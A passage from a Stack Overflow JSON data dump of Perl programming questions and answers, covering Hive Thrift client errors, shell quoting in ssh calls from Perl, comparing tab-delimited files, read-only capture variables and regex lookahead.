"Suggestions &amp; pointers will likely suitable as comment but not full answer. Add few more description about the methods you have mentioned to make it a meaningful answer. - <a href=\"http://stackoverflow.com/review/first-posts/12355414\">From Review</a>"}], "tags": [], "owner": {"reputation": 1, "user_id": 6335668, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-3-h_-AwH9gw/AAAAAAAAAAI/AAAAAAAACWU/fdoBL2OEDiI/photo.jpg?sz=128", "display_name": "David Morel", "link": "https://stackoverflow.com/users/6335668/david-morel"}, "is_accepted": false, "score": 0, "last_activity_date": 1463269199, "last_edit_date": 1463269199, "creation_date": 1463268885, "answer_id": 37232967, "question_id": 35799885, "link": "https://stackoverflow.com/questions/35799885/why-do-i-get-the-error-thrifttexception-hash0x122b9e0-when-i-try-to-execut/37232967#37232967", "title": "Why do I get the error &quot;Thrift::TException=HASH(0x122b9e0)&quot; when I try to execute a statement with Thrift::API::HiveClient?", "body": "<p>Thrift::API::HiveServer is for HiveServer, which has been deprecated for a long time. All reasonably recent Hadoop distros now feature HiveServer2, for which you need Thrift::API::HiveServer2.\nAlso, check the get_tables and get_columns methods, that'll give you better information than what you tried in your example.</p>\n"}], "owner": {"reputation": 1293, "user_id": 3090114, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/YC56w.jpg?s=128&g=1", "display_name": "Koushik Chandra", "link": "https://stackoverflow.com/users/3090114/koushik-chandra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 604, "favorite_count": 0, "accepted_answer_id": 36190426, "answer_count": 2, "score": 3, "last_activity_date": 1463269199, "creation_date": 1457105591, "last_edit_date": 1459144494, "question_id": 35799885, "link": "https://stackoverflow.com/questions/35799885/why-do-i-get-the-error-thrifttexception-hash0x122b9e0-when-i-try-to-execut", "title": "Why do I get the error &quot;Thrift::TException=HASH(0x122b9e0)&quot; when I try to execute a statement with Thrift::API::HiveClient?", "body": "<p>I am trying to connect to <a href=\"https://hive.apache.org/\" rel=\"nofollow\">Apache Hive</a> from a Perl script but I'm getting the following error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Thrift::TException=HASH(0x122b9e0)\n</code></pre>\n\n<p>I am running with Hadoop version 2.7.0, Hive version 1.1.0, and Thrift::API::HiveClient version 0.003. Here is the script I am using:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse English;\nuse Thrift::API::HiveClient;\n\nconnecttoHive();\n\nsub connecttoHive {\n    my $client = Thrift::API::HiveClient-&gt;new( host =&gt; 'localhost', port =&gt; 10000 );\n\n    $client-&gt;connect() or die \"Failed to connect\";\n\n    $client -&gt; execute('select count(1) from Koushik.emp2');\n    my $result = $client -&gt; fetchAll();\n}\n</code></pre>\n\n<p>Could this be caused by a version issue or is it something else?</p>\n\n<hr>\n\n<p>I also tried running the following script, which comes with the <code>Thrift-API-HiveClient-0.003</code> distribution:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse lib 'lib';\nuse Data::Dumper;\nuse Try::Tiny;\nuse Thrift::API::HiveClient;\n#use Moose;\n\nmy ($host, $port) = (localhost =&gt; 10000);\n\ntry sub {\n  my $client = Thrift::API::HiveClient-&gt;new( host =&gt; $host, port =&gt; $port );\n  $client-&gt;connect;\n  print \"Connected\\n\";\n  $client-&gt;execute(\n    q{ create table if not exists t_foo (foo STRING, bar STRING) }\n  );\n  $client-&gt;execute('show tables');\n  print Dumper $client-&gt;fetchAll;\n  print Dumper $client-&gt;getClusterStatus;\n  print Dumper $client-&gt;get_fields( 'default', 't_foo');\n},\ncatch sub {\n  print \"ZOMG\\n\";\n  print Dumper($_);\n  exit 1;\n};\n</code></pre>\n\n<p>I get the following output:</p>\n\n<pre><code>hduser@ubuntu:~/perl_script$ perl test-thrift.pl\nConnected\nZOMG\n$VAR1 = bless( {\n                 'message' =&gt; 'Missing version identifier',\n                 'code' =&gt; 0\n               }, 'Thrift::TException' );\n</code></pre>\n\n<p>After enabling NOSASL authentication on my HiveServer2 by modifying the hive-site.xml, I am now getting a different error:</p>\n\n<pre><code>hduser@ubuntu:~/perl_script$ perl test-thrift.pl\nConnected\nZOMG\n$VAR1 = bless( {\n                 'message' =&gt; 'Invalid method name: \\'execute\\'',\n                 'code' =&gt; 1\n               }, 'TApplicationException' );\n</code></pre>\n\n<p>It worked using <code>Thrift::API::HiveClient2</code></p>\n\n<pre><code>hduser@ubuntu:~/perl_script$ cat test-thrift-client2.pl\n#!/usr/bin/env perl\nuse lib 'lib';\nuse Data::Dumper;\nuse Try::Tiny;\nuse Thrift::API::HiveClient2;\n#use Moose;\n\nmy ($host, $port) = (localhost =&gt; 10000);\n\ntry sub {\n  my $client = Thrift::API::HiveClient2-&gt;new( host =&gt; $host, port =&gt; $port );\n  $client-&gt;connect;\n  print \"Connected\\n\";\n  $client-&gt;execute(\n    q{ create table if not exists t_foo (foo STRING, bar STRING) }\n  );\n  $client-&gt;execute('show tables');\n  print Dumper $client-&gt;fetch;\n# print Dumper $client-&gt;getClusterStatus;\n# print Dumper $client-&gt;get_fields( 'default', 't_foo');\n},\ncatch sub {\n  print \"ZOMG\\n\";\n  print Dumper($_);\n  exit 1;\n};\n\nhduser@ubuntu:~/perl_script$ perl test-thrift-client2.pl\nConnected\n$VAR1 = [\n          [\n            'drv_cdr_mp'\n          ],\n          [\n            'emp1'\n          ],\n          [\n            'emp3'\n          ],\n          [\n            'emp_1'\n          ],\n          [\n            'emp_bucket'\n          ],\n          [\n            'emp_incr_test'\n          ],\n          [\n            'emp_rslt'\n          ],\n          [\n            'log_detail'\n          ],\n          [\n            't_foo'\n          ],\n          [\n            'test1_emp1'\n          ]\n        ];\n$VAR2 = '';\n</code></pre>\n"}, {"tags": ["linux", "perl"], "comments": [{"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 0, "creation_date": 1457103010, "post_id": 35798591, "comment_id": 59267529, "body": "It&#39;s probably related to quoting and escaping of meta-characters"}, {"owner": {"reputation": 37, "user_id": 5821944, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/6a7951a617c081e5cecffe14665c0a5c?s=128&d=identicon&r=PG&f=1", "display_name": "stangada", "link": "https://stackoverflow.com/users/5821944/stangada"}, "reply_to_user": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 0, "creation_date": 1457103080, "post_id": 35798591, "comment_id": 59267584, "body": "I have tried all the combinations of escaping and I am still not getting the desired output. :("}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1457104519, "post_id": 35798591, "comment_id": 59268633, "body": "What is <code>$UNIQUE_CUSTOMER</code>? Is that an environment variable and can you reasonably expect it to be set on the remote host as you run <code>ssh</code>?"}, {"owner": {"reputation": 37, "user_id": 5821944, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/6a7951a617c081e5cecffe14665c0a5c?s=128&d=identicon&r=PG&f=1", "display_name": "stangada", "link": "https://stackoverflow.com/users/5821944/stangada"}, "edited": false, "score": 0, "creation_date": 1457160194, "post_id": 35798591, "comment_id": 59290608, "body": "yes $UNIQUE_CUSTOMER is an environment variable and the same is set on the remote host as well."}, {"owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "edited": false, "score": 0, "creation_date": 1457260936, "post_id": 35798591, "comment_id": 59318460, "body": "Try using <a href=\"https://metacpan.org/pod/Net::OpenSSH\" rel=\"nofollow noreferrer\">Net::OpenSSH</a> and letting it <a href=\"https://metacpan.org/pod/Net::OpenSSH#Shell-quoting\" rel=\"nofollow noreferrer\">do the quoting</a>."}], "answers": [{"comments": [{"owner": {"reputation": 37, "user_id": 5821944, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/6a7951a617c081e5cecffe14665c0a5c?s=128&d=identicon&r=PG&f=1", "display_name": "stangada", "link": "https://stackoverflow.com/users/5821944/stangada"}, "edited": false, "score": 0, "creation_date": 1457167201, "post_id": 35799055, "comment_id": 59292212, "body": "I used the below command;     &quot;$icount = qx {ssh -q rcs02 \\&quot;ls -lh \\$(find -L /opt/emageon/backup/\\${UNIQUE_CUSTOMER}*/\\$(date \\+%Y%m%d&#41; -type f)|grep sfdisk___sr0 | wc -l END {print NR}&quot;};&quot; I got the same output as explained in the original question."}, {"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "reply_to_user": {"reputation": 37, "user_id": 5821944, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/6a7951a617c081e5cecffe14665c0a5c?s=128&d=identicon&r=PG&f=1", "display_name": "stangada", "link": "https://stackoverflow.com/users/5821944/stangada"}, "edited": false, "score": 0, "creation_date": 1457177845, "post_id": 35799055, "comment_id": 59295220, "body": "replace qx{..} with qx&#39;...&#39;"}], "tags": [], "owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "is_accepted": false, "score": 0, "last_activity_date": 1457103742, "last_edit_date": 1457103742, "creation_date": 1457103350, "answer_id": 35799055, "question_id": 35798591, "link": "https://stackoverflow.com/questions/35798591/permission-error-for-certain-folders-while-executing-a-perl-file-in-linux-server/35799055#35799055", "title": "Permission error for certain folders while executing a perl file in Linux server", "body": "<p>Try using <code>qx{}</code> instead of the backtick operator. \nIn particular you can use <code>qx' ...'</code>.\nUsing single-quote as a delimiter protects the command from Perl's double-quote interpolcation, passing it on to the shell instead. </p>\n\n<p>You can omit the single quotes for the date format, they are not required.</p>\n\n<p>And you can replace the awk script with <code>wc -l</code>.</p>\n\n<p>Also you are using <code>ls</code> together with <code>find</code>. Usually \"find\" by itself is enough. Checkout the -printf option in the <code>find</code> man page. It can print the user name of the owner and much more. You can also use find to restrict the result to things owned by a particular user.</p>\n"}], "owner": {"reputation": 37, "user_id": 5821944, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/6a7951a617c081e5cecffe14665c0a5c?s=128&d=identicon&r=PG&f=1", "display_name": "stangada", "link": "https://stackoverflow.com/users/5821944/stangada"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 47, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1457103742, "creation_date": 1457101972, "last_edit_date": 1457102626, "question_id": 35798591, "link": "https://stackoverflow.com/questions/35798591/permission-error-for-certain-folders-while-executing-a-perl-file-in-linux-server", "title": "Permission error for certain folders while executing a perl file in Linux server", "body": "<p>I am executing a perl file in Linux server for automation scripts. It would be of great help if you could help on this. </p>\n\n<p>My current server is a two node cluster server and I am using perl automation scripts. I dont want to copy my perl file to both the nodes so I want to execute the command remotely using \"ssh\" command to the second node. My node 1 server is abd01 and my node 2 server is abd02. I have logged into abd01 and running a remote command for abd02. Below is my command :</p>\n\n<pre><code>ssh -q abd02 \"ls -lh \\$(find \\-L \\/opt\\/emageon\\/backup\\/\\${UNIQUE_CUSTOMER}*/\\$(date '+%Y%m%d') -type f)|grep sfdisk___sr0 | awk 'END {print NR}'\"\n</code></pre>\n\n<p>I get an output value of \"8\" for this. </p>\n\n<p>I am using the same command in a perl file along with the escape characters and when I run the perl file with the command \"perl icount.pl\" I do not get the desired output. Below is the perl script of icount.pl file that i am using</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse Config;\nuse Socket;\nuse POSIX qw(strftime);\nuse IO::Socket::INET;\n\n\nmy $icount;\n$icount = `ssh -q root\\@rcs02 \\\"ls -lh \\$(find -L /opt/emageon/backup/\\${UNIQUE_CUSTOMER}*/\\$(date \\'+%Y%m%d\\') -type f)|grep sfdisk___sr0 | awk 'END {print NR}'\"`;\n\nprint \"Value is $icount /n\";\n</code></pre>\n\n<p>The output that I get for this is as mentioned below;</p>\n\n<pre><code>Value is -rw-r----- 1 druser druser 3.1M Mar  4 01:59 /opt/emageon/backup/0050569143c5/20160304/drbackup/info/drosbackup.sh.log\n0\n</code></pre>\n\n<p>For most of the files I am getting messages as shown below</p>\n\n<p>bash: line 126: /opt/emageon/backup/005056916d4d/20160304/scbackup/DARC/201603040416/controlfile.txt: Permission denied</p>\n\n<p>I am really not sure why I am not getting the output of 8 when I am running the same command in perl file. Please help me on this as I am stuck amidst my automation scripts</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 1665, "user_id": 1848140, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/c0bc64ef33e6ab5560ce5c534190a6a0?s=128&d=identicon&r=PG&f=1", "display_name": "Nagaraju", "link": "https://stackoverflow.com/users/1848140/nagaraju"}, "edited": false, "score": 0, "creation_date": 1457093207, "post_id": 35795521, "comment_id": 59260848, "body": "Your title is too confusing. Can you make it more readable"}], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 2, "last_activity_date": 1457094489, "creation_date": 1457094489, "answer_id": 35796083, "question_id": 35795521, "link": "https://stackoverflow.com/questions/35795521/perl-to-find-unmatched-fields-in-two-files-and-in-one-file/35796083#35796083", "title": "Perl to find unmatched fields in two files and in one file", "body": "<p>Use hashes to remember the contents of the files:</p>\n\n<pre><code>#! /usr/bin/perl\nuse warnings;\nuse strict;\n\nmy %hash_a;\nopen my $FA, '&lt;', 'fileA.txt' or die $!;\nwhile (&lt;$FA&gt;) {\n    chomp;\n    my ($f1, $f2) = split /\\t/;\n    undef $hash_a{$f1}{$f2};\n}\n\n\nmy %hash_b;\nopen my $FB, '&lt;', 'fileB.txt' or die $!;\nwhile (&lt;$FB&gt;) {\n    chomp;\n    my ($f1, $f2) = split /\\t/;\n    push @{ $hash_b{$f1} }, $f2;\n\n    if (exists $hash_a{$f1} &amp;&amp; ! exists $hash_a{$f1}{$f2}) {\n        print \"#2: $f1 $f2\\n\";\n    }\n}\n\nfor my $key (grep @{ $hash_b{$_} } &gt; 1, keys %hash_b) {\n    print join(' ', \"#1: $key\", @{ $hash_b{$key} }), \"\\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 389, "user_id": 1625076, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/fRfxc.png?s=128&g=1", "display_name": "dellair", "link": "https://stackoverflow.com/users/1625076/dellair"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 0, "accepted_answer_id": 35796083, "answer_count": 1, "score": 0, "last_activity_date": 1457094489, "creation_date": 1457092857, "last_edit_date": 1457092962, "question_id": 35795521, "link": "https://stackoverflow.com/questions/35795521/perl-to-find-unmatched-fields-in-two-files-and-in-one-file", "title": "Perl to find unmatched fields in two files and in one file", "body": "<p>I have two txt files:</p>\n\n<p>fileA.txt (tab as delimiter)</p>\n\n<pre><code>field1  field2\nA       value1\nA       value2\nA       value3\nB       value112\nC       value33\nD       value11\nE       value3\nB       value23\nE       value5\n</code></pre>\n\n<p>fileB.txt (tab as delimiter)</p>\n\n<pre><code>field1  field2\nA       value1\nA       value3\nM       value9\nB       value5\nC       value33\n</code></pre>\n\n<p>I want the script to report: </p>\n\n<ol>\n<li>In fileB.txt, if two field1 have different field2<br>\nreport: A    value1 and A    value3</li>\n<li>In fileB.txt, if the field2 has different value than field2 in fileA.txt corresponding to the same field1<br>\nreport: B    value5</li>\n</ol>\n\n<p>So the output of the script is supposed to be:</p>\n\n<pre><code>A       value1\nA       value3\nB       value5\n</code></pre>\n\n<p>My script to accomplish #2:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nmy $fileA=\"/tmp/fileA.txt\";\nmy $fileB=\"/tmp/fileB.txt\";\nmy @orifields;\nmy @tmp;\nmy @unmatched;\n\nopen(FHD, \"$fileB\") || die \"Unable to open $fileB: $!\\n\";\n@orifields = &lt;FHD&gt;;\nclose(FHD);\nchomp(@orifields);\n\nopen(FHD, \"$fileA\") || die \"Unable to open $fileA: $!\\n\";\n@tmp = &lt;FHD&gt;;\nclose(FHD);\nchomp(@tmp);\nforeach my $line (@tmp){\n   print(\"Each line in fileA: $line\\n\");\n}\n\nforeach my $line (@orifields) {\n   my ($field1, $field2) = split(/\\t/, $line);\n   print(\"Field1 is: $field1, Field2 is: $field2\\n\");\n\n   if (! grep(/$line/, @tmp)) {\n      if (grep(/$field1/,@tmp)) {\n         push(@unmatched,\"$line\");\n      }\n   }\n}\n\nprint(\"Unmatched: @unmatched\\n\");\n</code></pre>\n\n<p>Is there any nice approach to achieve both in the script without duplication of variables? Thanks in advance,</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 1665, "user_id": 1848140, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/c0bc64ef33e6ab5560ce5c534190a6a0?s=128&d=identicon&r=PG&f=1", "display_name": "Nagaraju", "link": "https://stackoverflow.com/users/1848140/nagaraju"}, "edited": false, "score": 0, "creation_date": 1457093011, "post_id": 35795407, "comment_id": 59260733, "body": "I think You directly cant modify $3 assgn it a variable and then do the substitution"}], "answers": [{"comments": [{"owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 0, "creation_date": 1457333732, "post_id": 35795735, "comment_id": 59341865, "body": "Hi, Actually I am printing the output as below: <code>print &quot;$1&quot;, colored(&quot;$ques&quot;,&#39;underline&#39;,&#39;yellow&#39;),&quot;$party&quot;,&quot;\\n&quot;;</code> And it is printing the complete text in underline if I replace ~ with \\n before splitting it."}], "tags": [], "owner": {"reputation": 631, "user_id": 2532388, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f36529bfd03515462331695824deaa0?s=128&d=identicon&r=PG", "display_name": "Jos&#233; Castro", "link": "https://stackoverflow.com/users/2532388/jos%c3%a9-castro"}, "is_accepted": false, "score": 2, "last_activity_date": 1457108776, "last_edit_date": 1457108776, "creation_date": 1457093414, "answer_id": 35795735, "question_id": 35795407, "link": "https://stackoverflow.com/questions/35795407/getting-error-of-modification-of-a-read-only-value-attempted/35795735#35795735", "title": "Getting Error of Modification of a read-only value attempted", "body": "<p>Just like you say, the special variables <code>$1</code>, <code>$2</code>, etc., are read-only, and that means that you can't perform that substitution on them.</p>\n\n<p>Performing the substitution on <code>$ques</code> will do what you need:</p>\n\n<pre><code>$ques =~ s/~/\\n/g;\nprint $ques;\n</code></pre>\n\n<p>Do note that in the earlier substitution that you're performing on <code>$ques</code> you're getting rid of all the <code>~</code> characters.</p>\n"}, {"comments": [{"owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 0, "creation_date": 1457334125, "post_id": 35796364, "comment_id": 59342042, "body": "I am using Perl 5.10. And it seems this is giving a syntax error while implementing."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 1, "creation_date": 1457334650, "post_id": 35796364, "comment_id": 59342252, "body": "Yes. As I said, this feature was added in Perl 5.14. Why don&#39;t you use a version of Perl that was released this decade? :-)"}, {"owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 0, "creation_date": 1457334994, "post_id": 35796364, "comment_id": 59342412, "body": "I am working on something for my personal use but in office system. So I cannot upgrade it untill and unless I have a manager&#39;s approval. :P"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 1, "creation_date": 1457336389, "post_id": 35796364, "comment_id": 59343051, "body": "Well, firstly, why is your office using such an old version of Perl? And, secondly, you don&#39; need to upgrade the system Perl - use perlbrew to install a newer version of Perl alongside the existing one."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 3, "last_activity_date": 1457103160, "last_edit_date": 1457103160, "creation_date": 1457095308, "answer_id": 35796364, "question_id": 35795407, "link": "https://stackoverflow.com/questions/35795407/getting-error-of-modification-of-a-read-only-value-attempted/35796364#35796364", "title": "Getting Error of Modification of a read-only value attempted", "body": "<p>You've already got a good explanation of the problem from Jos\u00e9 Castro. But there's another solution if you're using a recent-ish version of Perl (<strong>Update:</strong> having checked more carefully, I find that means 5.14+). The <code>/r</code> argument to the substitution operator will copy your string, make the substitution on the copy and then return that altered value.</p>\n\n<p>So you could write:</p>\n\n<pre><code>my $new_value = $3 =~ s/~/\\n/rg;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 0, "creation_date": 1457334073, "post_id": 35799960, "comment_id": 59342017, "body": "Thanks, My approach was wrong. Using this, i am getting the desired result!"}], "tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": true, "score": 2, "last_activity_date": 1457105799, "creation_date": 1457105799, "answer_id": 35799960, "question_id": 35795407, "link": "https://stackoverflow.com/questions/35795407/getting-error-of-modification-of-a-read-only-value-attempted/35799960#35799960", "title": "Getting Error of Modification of a read-only value attempted", "body": "<p>It sounds like what you really want in this case is <a href=\"http://perldoc.perl.org/functions/split.html\" rel=\"nofollow\">split</a> rather than regular expression capture groups:</p>\n\n<pre><code>my @parts = split(/@/, $ques);\n$parts[2] =~ s/~/\\n/g;\n</code></pre>\n\n<p>It makes the intent of your code clearer since you are, in fact, splitting on <code>@</code> symbols.</p>\n"}], "owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 326, "favorite_count": 0, "accepted_answer_id": 35799960, "answer_count": 3, "score": 1, "last_activity_date": 1457108776, "creation_date": 1457092514, "last_edit_date": 1457104513, "question_id": 35795407, "link": "https://stackoverflow.com/questions/35795407/getting-error-of-modification-of-a-read-only-value-attempted", "title": "Getting Error of Modification of a read-only value attempted", "body": "<p>I am trying to select the below value from database:</p>\n\n<blockquote>\n  <p>Reporting that one of @its many problems had been the recent@ extended\n  sales slump in women's apparel, the seven-store retailer said it would\n  start a three-month liquidation sale in all of its stores.~(A) its\n  many problems had been the recent~(B) its many problems has been the\n  recently~(C) its many problems is the recently~(D) their many problems\n  is the recent~(E) their many problems had been the recent~</p>\n</blockquote>\n\n<p>i am selecting this value in variable $ques and then selecting a text as below:</p>\n\n<pre><code>$ques=~s/^(.*?)\\@(.*?)\\@(.*?)$/$2/;\n</code></pre>\n\n<p>Now, while replacing the ~ character in the string by </p>\n\n<pre><code>$3=~s/~/\\n/g;    ----&gt;line 171\n</code></pre>\n\n<p>and running the script, I am getting one error as:</p>\n\n<pre><code>Modification of a read-only value attempted at main.pl line 171\n</code></pre>\n\n<p>I want to replace all the ~ character with '\\n' and print the final value. Please suggest how to do it. </p>\n\n<p>*I have researched this on net, but got confused that how to handle these read only variables.</p>\n"}, {"tags": ["regex", "perl", "regex-lookarounds"], "answers": [{"tags": [], "owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "is_accepted": true, "score": 3, "last_activity_date": 1457095678, "last_edit_date": 1457095678, "creation_date": 1457093637, "answer_id": 35795814, "question_id": 35795381, "link": "https://stackoverflow.com/questions/35795381/possible-to-not-lose-the-matched-string/35795814#35795814", "title": "Possible to not lose the matched string?", "body": "<p>You should check \"Look-Around Assertions\" in <a href=\"http://perldoc.perl.org/perlre.html\" rel=\"nofollow\"><code>perlre</code></a>.</p>\n\n<p>Use positive lookahead<code>(?=)</code>:</p>\n\n<blockquote>\n  <p><code>(?=pattern)</code> : A zero-width positive look-ahead assertion. For example,\n  <code>/\\w+(?=\\t)/</code> matches a word followed by a tab, without including the\n  tab in <code>$&amp;</code> .</p>\n</blockquote>\n\n<pre><code>\"\\K.*?(?=\")\n</code></pre>\n\n<p>So, here trailing <code>\"</code> will match, but will not get captured in <code>$&amp;</code>.</p>\n"}], "owner": {"reputation": 5139, "user_id": 3293148, "user_type": "registered", "accept_rate": 99, "profile_image": "https://www.gravatar.com/avatar/a5b0a16cfd67f7e3944d886fd1bebde5?s=128&d=identicon&r=PG", "display_name": "Jasmine Lognnes", "link": "https://stackoverflow.com/users/3293148/jasmine-lognnes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "accepted_answer_id": 35795814, "answer_count": 1, "score": 0, "last_activity_date": 1465598806, "creation_date": 1457092437, "last_edit_date": 1465598806, "question_id": 35795381, "link": "https://stackoverflow.com/questions/35795381/possible-to-not-lose-the-matched-string", "title": "Possible to not lose the matched string?", "body": "<p>If I do</p>\n\n<pre><code>perl -i -slpe 's/$wgDBserver = \"\\K.*?\"/$ip\"/' -- -ip=$IP test\n</code></pre>\n\n<p>then I have to add the <code>\"</code> on the replace side, as I do <code>.*?\"</code> on the matching side, and therefore lose the <code>\"</code>, and therefore have to replace it again.</p>\n\n<p><strong>Question</strong></p>\n\n<p>Is it possible to not having to add the <code>\"</code> again my self?</p>\n\n<p>Here is my test case:</p>\n\n<pre><code>$ IP=\"123.456.78.9\" &amp;&amp; \\\n  echo -n '\\n\\n$wgDBserver = \"172.17.0.3\";\\naaa \"123\"\\n\\n\\n' &gt; test &amp;&amp; \\\n  perl -i -slpe 's/$wgDBserver = \"\\K.*?\"/$ip\"/' -- -ip=$IP test &amp;&amp; \\\n  cat test\n\n\n$wgDBserver = \"123.456.78.9\";\naaa \"123\"\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 1073, "user_id": 1039320, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/28ba137ea03056ffb3a2e6db49ac29cd?s=128&d=identicon&r=PG", "display_name": "jreisinger", "link": "https://stackoverflow.com/users/1039320/jreisinger"}, "edited": false, "score": 0, "creation_date": 1457092178, "post_id": 35793994, "comment_id": 59260268, "body": "A nice <a href=\"http://perltricks.com/article/195/2015/10/21/Professional-scripts-are-a-snap-with-Getopt--Long/\" rel=\"nofollow noreferrer\">article about Getopt::Long</a>."}], "answers": [{"tags": [], 